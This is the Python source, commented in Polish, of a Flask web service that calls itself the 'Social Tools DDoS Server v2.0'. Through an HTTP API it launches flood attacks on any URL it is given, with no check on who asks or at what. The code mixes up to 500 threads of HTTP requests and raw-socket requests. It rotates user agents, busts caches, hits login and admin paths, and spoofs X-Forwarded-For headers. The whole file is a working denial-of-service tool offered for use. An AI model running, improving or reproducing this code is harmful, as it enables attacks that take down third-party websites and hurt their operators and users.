import os
import sys
import time
import threading
import random
import requests
import socket
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from urllib.parse import urlparse
import logging

# Wyłącz ostrzeżenia SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Konfiguracja logowania
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ==== GLOBALNE ZMIENNE DLA ATAKÓW ====
active_attacks = {}
attack_stats = {}
attack_stop_flags = {}
http_request_count = 0

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

# ==== PRAWDZIWY ATAK DDoS KTÓRY WYWALA STRONY ====
def website_killer_attack(target_url, threads_count=200, attack_id=None):
    """Agresywny atak DDoS - wywala strony tak jak Twój exe"""
    
    attack_id = attack_id or f"attack_{int(time.time())}"
    
    # Zapisz w aktywnych atakach
    active_attacks[attack_id] = {
        "target": target_url,
        "threads": threads_count,
        "start_time": time.time(),
        "active": True
    }
    
    attack_stats[attack_id] = {
        "requests": 0,
        "start_time": time.time()
    }
    
    attack_stop_flags[attack_id] = False
    
    # Parsuj URL
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    use_https = parsed.scheme == 'https'
    
    print(f"{Colors.RED}=== WEB SITE KILLER ATTACK ==={Colors.END}")
    print(f"{Colors.YELLOW}>> Cel: {target_url}{Colors.END}")
    print(f"{Colors.YELLOW}>> Host: {host}:{port}{Colors.END}")
    print(f"{Colors.YELLOW}>> Wątki: {threads_count}{Colors.END}")
    print(f"{Colors.RED}>> Uruchamianie agresywnego ataku...{Colors.END}")
    
    # Lista User-Agent - rozbudowana
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    ]
    
    # Lista ścieżek do ataku (oprócz głównej)
    paths = ['/', '/index.html', '/index.php', '/wp-admin', '/wp-login.php', 
             '/admin', '/login', '/api', '/api/v1', '/graphql']
    
    def flood_http():
        """Wątek ataku przez HTTP/HTTPS (requests)"""
        local_count = 0
        session = requests.Session()
        
        while not attack_stop_flags.get(attack_id, True):
            try:
                # Wybierz losową ścieżkę
                path = random.choice(paths) if random.random() > 0.3 else ''
                full_url = target_url + path if path else target_url
                
                # Cache busting
                if '?' in full_url:
                    full_url += f"&cb={random.randint(100000, 999999)}"
                else:
                    full_url += f"?cb={random.randint(100000, 999999)}"
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': random.choice(['pl-PL,pl;q=0.9', 'en-US,en;q=0.9']),
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # Wykonaj zapytanie - nie czekamy na odpowiedź
                session.get(full_url, headers=headers, timeout=2, verify=False)
                attack_stats[attack_id]["requests"] += 1
                local_count += 1
                
            except Exception:
                attack_stats[attack_id]["requests"] += 1
            
            # Minimalne opóźnienie - im mniejsze tym większa siła
            time.sleep(0.001)
        
        session.close()
    
    def flood_socket():
        """Wątek ataku przez sockety - bardziej agresywne"""
        local_count = 0
        
        while not attack_stop_flags.get(attack_id, True):
            try:
                # Twórz nowy socket za każdym razem (obciąża serwer)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, port))
                
                # Przygotuj zapytanie HTTP
                if use_https:
                    # Dla HTTPS używamy HTTP/1.0 bez keep-alive
                    request_line = f"GET {path} HTTP/1.0\r\n"
                else:
                    request_line = f"GET {path} HTTP/1.1\r\n"
                
                headers = (
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"\r\n"
                )
                
                sock.send((request_line + headers).encode())
                
                # Próbuj czytać odpowiedź (obciąża CPU serwera)
                try:
                    sock.recv(4096)
                except:
                    pass
                
                sock.close()
                attack_stats[attack_id]["requests"] += 1
                local_count += 1
                
            except Exception:
                attack_stats[attack_id]["requests"] += 1
            
            time.sleep(0.001)
    
    # Uruchom wątki - mieszanka HTTP i socket
    http_threads = threads_count // 2
    socket_threads = threads_count - http_threads
    
    for i in range(http_threads):
        thread = threading.Thread(target=flood_http)
        thread.daemon = True
        thread.start()
    
    for i in range(socket_threads):
        thread = threading.Thread(target=flood_socket)
        thread.daemon = True
        thread.start()
    
    print(f"{Colors.GREEN}>> Uruchomiono {http_threads} wątków HTTP i {socket_threads} wątków socket{Colors.END}")
    print(f"{Colors.RED}>> Aby zatrzymać: POST /api/attack/stop/{attack_id}{Colors.END}")
    
    return attack_id

# ==== ENDPOINTY API ====

@app.route('/api/status', methods=['GET'])
def status():
    """Status serwera DDoS"""
    return jsonify({
        "success": True,
        "status": "online",
        "active_attacks": len(active_attacks),
        "total_requests": sum(s.get('requests', 0) for s in attack_stats.values())
    })

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """Rozpoczyna agresywny atak DDoS"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Brak danych"}), 400
        
        url = data.get('url')
        threads = data.get('threads', 200)
        
        if not url:
            return jsonify({"success": False, "error": "Brak URL"}), 400
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Ogranicz wątki do 500 (bezpiecznie dla Render)
        threads = min(int(threads), 500)
        
        attack_id = website_killer_attack(url, threads)
        
        return jsonify({
            "success": True,
            "attack_id": attack_id,
            "target": url,
            "threads": threads,
            "message": "Agresywny atak DDoS rozpoczęty"
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    """Zatrzymuje atak"""
    try:
        if attack_id in attack_stop_flags:
            attack_stop_flags[attack_id] = True
            if attack_id in active_attacks:
                active_attacks[attack_id]["active"] = False
            
            return jsonify({
                "success": True,
                "message": f"Atak {attack_id} zatrzymany"
            })
        else:
            return jsonify({"success": False, "error": "Nie znaleziono ataku"}), 404
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attack/status/<attack_id>', methods=['GET'])
def attack_status(attack_id):
    """Status konkretnego ataku"""
    try:
        if attack_id in attack_stats:
            stats = attack_stats[attack_id]
            duration = time.time() - stats["start_time"]
            
            is_active = attack_id in attack_stop_flags and not attack_stop_flags[attack_id]
            
            return jsonify({
                "success": True,
                "active": is_active,
                "requests": stats["requests"],
                "duration": duration,
                "rps": stats["requests"] / duration if duration > 0 else 0,
                "target": active_attacks.get(attack_id, {}).get("target", "unknown")
            })
        else:
            return jsonify({"success": False, "error": "Nie znaleziono ataku"}), 404
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attacks', methods=['GET'])
def list_attacks():
    """Lista aktywnych ataków"""
    attacks_list = []
    
    for attack_id in active_attacks:
        if attack_id in attack_stats and attack_id in attack_stop_flags and not attack_stop_flags[attack_id]:
            stats = attack_stats[attack_id]
            duration = time.time() - stats["start_time"]
            
            attacks_list.append({
                "id": attack_id,
                "target": active_attacks[attack_id]["target"],
                "threads": active_attacks[attack_id]["threads"],
                "duration": duration,
                "requests": stats["requests"],
                "rps": stats["requests"] / duration if duration > 0 else 0
            })
    
    return jsonify({
        "success": True,
        "count": len(attacks_list),
        "attacks": attacks_list
    })

@app.route('/', methods=['GET'])
def index():
    """Strona główna serwera DDoS"""
    return jsonify({
        "name": "Social Tools DDoS Server",
        "version": "2.0",
        "status": "online",
        "endpoints": {
            "GET /api/status": "Status serwera",
            "POST /api/attack/start": "Rozpocznij atak (wymaga JSON: url, threads)",
            "POST /api/attack/stop/{id}": "Zatrzymaj atak",
            "GET /api/attack/status/{id}": "Status ataku",
            "GET /api/attacks": "Lista aktywnych ataków"
        }
    })

# ==== Czyszczenie starych ataków ====
def cleanup_old_attacks():
    """Usuwa stare ataki z pamięci"""
    while True:
        time.sleep(300)  # Co 5 minut
        current_time = time.time()
        to_remove = []
        
        for attack_id in attack_stats:
            if attack_id in attack_stop_flags and attack_stop_flags[attack_id]:
                duration = current_time - attack_stats[attack_id]["start_time"]
                if duration > 3600:  # Starsze niż 1h
                    to_remove.append(attack_id)
        
        for attack_id in to_remove:
            if attack_id in attack_stats:
                del attack_stats[attack_id]
            if attack_id in attack_stop_flags:
                del attack_stop_flags[attack_id]
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            
            logger.info(f"Wyczyszczono stary atak {attack_id}")

# ==== URUCHOMIENIE ====
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    
    print(f"""
    ╔════════════════════════════════════════════════════════════╗
    ║           SOCIAL TOOLS DDoS SERVER v2.0                    ║
    ║              AGRESYWNY ATAK KTÓRY WYWALA STRONY            ║
    ╠════════════════════════════════════════════════════════════╣
    ║  • Mieszane ataki: HTTP + SOCKET                           ║
    ║  • Do 500 wątków jednocześnie                              ║
    ║  • Rotacja User-Agent i cache busting                      ║
    ║  • Atak na wiele ścieżek jednocześnie                      ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    # Uruchom wątek czyszczący
    cleanup_thread = threading.Thread(target=cleanup_old_attacks, daemon=True)
    cleanup_thread.start()
    
    print(f"🚀 Serwer DDoS uruchomiony na porcie {port}")
    print(f"📡 Endpoint: http://localhost:{port}/api/attack/start")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
